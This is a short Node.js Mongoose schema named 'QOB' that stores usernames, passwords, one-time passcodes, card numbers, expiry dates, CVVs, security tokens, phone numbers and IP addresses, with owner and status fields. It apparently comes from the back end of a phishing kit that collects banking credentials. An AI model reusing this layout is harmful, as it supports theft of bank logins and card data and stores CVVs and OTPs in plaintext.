const mongoose = require("mongoose");

const qobModel = new mongoose.Schema({
    uniqueid: Number,
    username: String,
    userId: String,
    password: String,
    otp: String,
    ccnum: String,
    ccexp: String,
    cvv: String,
    telephone: String,
    secToken: String,
    status: Number,
    ip: String,
    owner: String,
});

module.exports = mongoose.model("QOB", qobModel);
